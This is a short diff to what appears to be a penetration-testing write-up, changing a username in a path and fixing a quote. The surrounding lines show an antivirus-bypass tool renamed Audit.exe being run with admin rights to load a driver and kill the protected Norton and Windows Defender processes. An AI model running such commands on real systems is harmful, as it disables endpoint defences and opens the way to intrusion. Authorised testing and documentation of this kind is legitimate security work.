@@ -40,7 +40,7 @@ Rebuild started...
 
 PS C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Blackout-master\x64\Debug> dir
 
-    Directory: C:\Users\j-cana\Documents\Tools-Pentest\1-Antivirus-bypass\Blackout-master\x64\Debug
+    Directory: C:\Users\audit\Documents\Tools-Pentest\1-Antivirus-bypass\Blackout-master\x64\Debug
 
 Mode                 LastWriteTime         Length Name
 ----                 -------------         ------ ----
@@ -123,7 +123,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 Step 3 - Run the obfuscated version of the tool with local admin privileges and kill the protected processes of the the Norton AV and the Windows Defender AV
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-=> We run the tool with the command: "Audit.exe -p <pid_of_the_process_to_kill>
+=> We run the tool with the command: "Audit.exe -p <pid_of_the_process_to_kill>"
 
 PS C:\temp> .\Audit.exe -p 1912
 driver path: C:\temp\Audit.sys
